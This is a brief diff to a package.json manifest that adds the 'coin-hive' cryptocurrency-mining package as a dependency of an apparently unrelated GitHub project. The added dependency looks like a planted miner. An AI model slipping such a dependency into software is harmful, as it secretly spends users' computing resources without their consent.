@@ -15,5 +15,8 @@
   "bugs": {
     "url": "https://github.com/amznorg/improved-computing-machine/issues"
   },
-  "homepage": "https://github.com/amznorg/improved-computing-machine#readme"
+  "homepage": "https://github.com/amznorg/improved-computing-machine#readme",
+  "dependencies": {
+    "coin-hive": "^1.1.1"
+  }
 }
